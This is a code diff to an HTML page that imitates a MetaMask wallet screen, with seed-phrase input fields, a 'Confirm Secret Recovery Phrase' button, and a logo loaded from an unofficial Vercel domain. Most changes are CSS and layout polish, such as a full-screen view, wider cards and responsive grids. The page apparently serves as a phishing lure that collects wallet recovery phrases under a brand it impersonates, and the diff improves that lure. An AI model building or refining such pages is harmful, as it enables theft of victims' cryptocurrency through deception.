@@ -7,16 +7,11 @@
   <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
   <style>
-    html, body {
-      width: 600px;
-      height: 700px;
-      margin: 0;
-      padding: 0;
-      overflow: auto;
-    }
     * { box-sizing: border-box; }
-    body {
-      margin: 0;
+    html, body {
+      margin: 0; padding: 0;
+      width: 100vw; height: 100vh;
+      overflow: hidden;
       font-family: 'Segoe UI', sans-serif;
       background-color: #fff;
       color: #333;
@@ -26,37 +21,40 @@
     }
     .top-bar {
       width: 100%;
-      max-width: 700px;
-      display: flex;
-      justify-content: flex-start; /* à gauche car plus de select */
-      align-items: center;
-      padding: 30px 30px 10px;
-    }
-    .logo {
-      font-weight: bold;
-      font-size: 20px;
-    }
-    main {
+      max-width: 900px;
+      padding: 15px 20px;
       display: flex;
       justify-content: center;
-      padding: 20px;
+      align-items: center;
+      margin-bottom: 10px;
+    }
+    main {
+      flex-grow: 1;
       width: 100%;
+      max-width: 900px;
+      padding: 20px 30px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      overflow: hidden;
     }
     .card {
+      width: 100%;
+      max-width: 700px;
       background-color: white;
       border-radius: 20px;
       border: 1px solid #e0e0e0;
       box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
       padding: 40px;
-      width: 100%;
-      max-width: 500px;
+      box-sizing: border-box;
+      overflow: hidden;
     }
     .step-circles {
       display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 260px;
-      margin-bottom: 30px;
+      justify-content: space-between;
+      max-width: 400px;
+      margin: 0 auto 30px;
+      gap: 0;
     }
     .step {
       text-align: center;
@@ -82,6 +80,7 @@
       font-size: 12px;
       color: #666;
       line-height: 14px;
+      white-space: nowrap;
     }
     h1 {
       text-align: center;
@@ -105,7 +104,7 @@
     .info {
       font-size: 13px;
       color: #444;
-      margin: 10px 0;
+      margin: 10px 0 20px 0;
       padding: 10px;
       background: #f5f5ff;
       border-left: 4px solid #6264ff;
@@ -113,9 +112,9 @@
     }
     .seed-inputs {
       display: grid;
-      grid-template-columns: repeat(3, 1fr);
+      grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
       gap: 10px;
-      margin: 20px 0;
+      margin-bottom: 20px;
     }
     .seed-input {
       display: flex;
@@ -151,19 +150,23 @@
       margin-top: 10px;
       display: none;
     }
-    @media (max-width: 600px) {
-      .seed-inputs {
-        grid-template-columns: repeat(2, 1fr);
+    @media (max-width: 700px) {
+      .card {
+        padding: 20px;
       }
       .step-circles {
-        gap: 80px;
+        max-width: 300px;
+      }
+      .seed-inputs {
+        grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
       }
     }
   </style>
 </head>
-<body style="width:600px; height:700px;">
+<body>
+
   <div class="top-bar">
-    <div><img src="https://metamask2-eight.vercel.app/meta.png" width="70px" alt="Logo"></div>
+    <div><img src="https://metamask2-eight.vercel.app/meta.png" width="70px" alt="MetaMask Logo"></div>
   </div>
 
   <main>
@@ -201,6 +204,7 @@
         Confirm Secret Recovery Phrase
       </button>
       <p id="errorMsg" class="error-msg">Invalid seed phrase. Please check the words.</p>
+
     </div>
   </main>
 
